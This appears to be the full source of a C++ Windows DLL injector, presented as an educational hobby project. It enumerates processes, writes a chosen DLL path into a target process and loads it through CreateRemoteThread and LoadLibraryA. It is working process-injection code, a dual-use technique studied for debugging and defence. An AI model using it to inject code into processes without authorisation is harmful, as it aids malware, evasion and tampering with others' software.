#include <iostream>
#include <windows.h>
#include <TlHelp32.h>
#include <string>
#include <iomanip>
#include <commdlg.h>
#include <vector>

// Function to display error messages with GetLastError()
void displayError(const std::string& action) {
    DWORD errorCode = GetLastError();
    LPVOID errorMessage = nullptr;

    // Format the error message
    FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        nullptr,
        errorCode,
        0, // Default language
        (LPSTR)&errorMessage,
        0,
        nullptr
    );

    std::cerr << "Error occurred while " << action << ":\n"
        << "Error " << errorCode << ": " << (char*)errorMessage << std::endl;

    // Free the buffer allocated by FormatMessage
    LocalFree(errorMessage);

    system("PAUSE");
}

int main() {
    std::cout << "This DLL injector was made by Robert Motrogeanu for educational purposes.\n"
        << "Its contents can be found on my GitHub linked below.\n"
        << "github.com/robertmotr\n\n"
        << "Select a DLL file to inject." << std::endl;

    // Initialize the OPENFILENAME structure
    OPENFILENAMEA ofnDialog = { 0 };
    char dllPath[MAX_PATH] = { 0 };
    char filter[] = "Dynamic Link Libraries (*.dll)\0*.dll\0All Files (*.*)\0*.*\0\0";

    ofnDialog.lStructSize = sizeof(ofnDialog);
    ofnDialog.hwndOwner = nullptr;
    ofnDialog.lpstrFile = dllPath;
    ofnDialog.nMaxFile = MAX_PATH;
    ofnDialog.lpstrFilter = filter;
    ofnDialog.nFilterIndex = 1;
    ofnDialog.lpstrTitle = "Select a DLL to inject.";
    ofnDialog.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;

    // Loop the file dialog menu to ensure user selects a DLL or chooses to exit
    while (true) {
        if (GetOpenFileNameA(&ofnDialog) == 0) {
            DWORD error = CommDlgExtendedError();
            if (error == 0) {
                // User canceled the dialog
                std::cout << "File selection canceled." << std::endl;
                return 0; // Exit the application
            }
            else {
                // An error occurred
                std::cerr << "An error occurred while selecting a file.\n"
                    << "CommDlg error code: 0x" << std::uppercase << std::hex << error << std::endl;
                system("PAUSE");
                return -1;
            }
        }
        else {
            std::cout << "Path of DLL selected: " << dllPath << std::endl;
            break;
        }
    }

    // Enumerate over all processes
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        displayError("creating process snapshot");
        return -1;
    }

    PROCESSENTRY32 pe32 = { 0 };
    pe32.dwSize = sizeof(PROCESSENTRY32);

    std::vector<PROCESSENTRY32> processes;

    if (Process32First(hSnap, &pe32)) {
        do {
            processes.push_back(pe32);
        } while (Process32Next(hSnap, &pe32));
    }
    else {
        displayError("retrieving process information");
        CloseHandle(hSnap);
        return -1;
    }
    CloseHandle(hSnap);

    std::cout << std::left << std::setw(30) << "Process Name"
        << std::setw(10) << "PID" << std::endl;
    std::cout << "----------------------------------------" << std::endl;
    for (const auto& proc : processes) {
        std::wcout << std::left << std::setw(30) << proc.szExeFile
            << std::setw(10) << std::dec << proc.th32ProcessID << std::endl;
    }

    // Get the process ID from the user
    DWORD procId = 0;
    std::cout << "\nEnter the Process ID (PID) of the target process: ";
    std::cin >> procId;

    // Validate the entered PID
    auto it = std::find_if(processes.begin(), processes.end(),
        [procId](const PROCESSENTRY32& proc) {
            return proc.th32ProcessID == procId;
        });
    if (it == processes.end()) {
        std::cerr << "Invalid PID entered. Exiting." << std::endl;
        return -1;
    }

    // Open the target process with necessary access rights
    DWORD desiredAccess = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;
    HANDLE hTarget = OpenProcess(desiredAccess, FALSE, procId);

    if (hTarget == NULL) {
        displayError("opening target process");
        return -1;
    }

    // Get the full path of the DLL
    char fullDllPath[MAX_PATH] = { 0 };
    if (GetFullPathNameA(dllPath, MAX_PATH, fullDllPath, nullptr) == 0) {
        displayError("getting full DLL path");
        CloseHandle(hTarget);
        return -1;
    }

    // Allocate memory in the target process for the DLL path
    LPVOID dllAlloc = VirtualAllocEx(hTarget, NULL, strlen(fullDllPath) + 1,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!dllAlloc) {
        displayError("allocating memory in target process");
        CloseHandle(hTarget);
        return -1;
    }

    // Write the DLL path into the allocated memory
    if (!WriteProcessMemory(hTarget, dllAlloc, fullDllPath, strlen(fullDllPath) + 1, NULL)) {
        displayError("writing DLL path to target process memory");
        VirtualFreeEx(hTarget, dllAlloc, 0, MEM_RELEASE);
        CloseHandle(hTarget);
        return -1;
    }

    // Get the address of LoadLibraryA in the local process
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) {
        displayError("getting handle to kernel32.dll in local process");
        VirtualFreeEx(hTarget, dllAlloc, 0, MEM_RELEASE);
        CloseHandle(hTarget);
        return -1;
    }

    FARPROC loadLibraryAddress = GetProcAddress(hKernel32, "LoadLibraryA");
    if (!loadLibraryAddress) {
        displayError("getting address of LoadLibraryA");
        VirtualFreeEx(hTarget, dllAlloc, 0, MEM_RELEASE);
        CloseHandle(hTarget);
        return -1;
    }

    // Calculate the offset of LoadLibraryA from the base of kernel32.dll
    uintptr_t loadLibraryOffset = (uintptr_t)loadLibraryAddress - (uintptr_t)hKernel32;

    // Get the base address of kernel32.dll in the target process
    HMODULE hKernel32Remote = NULL;
    MODULEENTRY32 me32 = { 0 };
    me32.dwSize = sizeof(MODULEENTRY32);

    HANDLE hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, procId);
    if (hModuleSnap == INVALID_HANDLE_VALUE) {
        displayError("creating module snapshot of target process");
        VirtualFreeEx(hTarget, dllAlloc, 0, MEM_RELEASE);
        CloseHandle(hTarget);
        return -1;
    }

    BOOL moduleFound = FALSE;
    if (Module32First(hModuleSnap, &me32)) {
        do {
            if (_wcsicmp(me32.szModule, L"kernel32.dll") == 0) {
                hKernel32Remote = reinterpret_cast<HMODULE>(me32.modBaseAddr);
                moduleFound = TRUE;
                break;
            }
        } while (Module32Next(hModuleSnap, &me32));
    }
    CloseHandle(hModuleSnap);

    if (!moduleFound || !hKernel32Remote) {
        displayError("finding kernel32.dll in target process");
        VirtualFreeEx(hTarget, dllAlloc, 0, MEM_RELEASE);
        CloseHandle(hTarget);
        return -1;
    }

    // Calculate the address of LoadLibraryA in the target process
    FARPROC loadLibraryAddressRemote = (FARPROC)((uintptr_t)hKernel32Remote + loadLibraryOffset);

    // Create a remote thread in the target process to load the DLL
    HANDLE remoteThread = CreateRemoteThread(
        hTarget,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)loadLibraryAddressRemote,
        dllAlloc,
        0,
        NULL
    );

    if (!remoteThread) {
        displayError("creating remote thread in target process");
        VirtualFreeEx(hTarget, dllAlloc, 0, MEM_RELEASE);
        CloseHandle(hTarget);
        return -1;
    }

    // Wait for the remote thread to finish
    WaitForSingleObject(remoteThread, INFINITE);

    // Clean up
    VirtualFreeEx(hTarget, dllAlloc, 0, MEM_RELEASE);
    CloseHandle(remoteThread);
    CloseHandle(hTarget);

    std::cout << "DLL injection completed successfully!" << std::endl;
    system("PAUSE");
    return 0;
}
